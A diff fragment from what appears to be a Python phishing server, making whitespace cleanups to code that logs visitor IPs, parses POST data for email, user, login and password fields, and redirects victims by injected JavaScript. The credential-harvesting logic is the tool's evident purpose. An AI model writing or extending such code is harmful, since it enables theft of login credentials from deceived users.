@@ -45,17 +45,14 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
             if re.search('^'+'X-Forwarded-For',lines):
                 address = lines.split('X-Forwarded-For: ')
                 self.ips.append(address[1])
-        
 
     def log_message(self, format, *args):
         logging.error(self.headers)
-
 
     def getCredentials(self, values):
         post = values.decode('UTF-8')
         readpost = post.strip('&')
         forms = ['email','user','login','pass'] #Possibles forms to get the credentials
-        
         readpost = readpost.split('&')
         count = 0
         possibles = []
@@ -80,8 +77,6 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
     def redirect(self):
         urlf = open('site/redirect.txt','r')
         url = urlf.readlines()
-       
-        response = BytesIO()
         redir = "<script>window.location.href=\"%s\"</script>" % (url[0])
         self.wfile.write(redir.encode())
         print('[+] Done!')
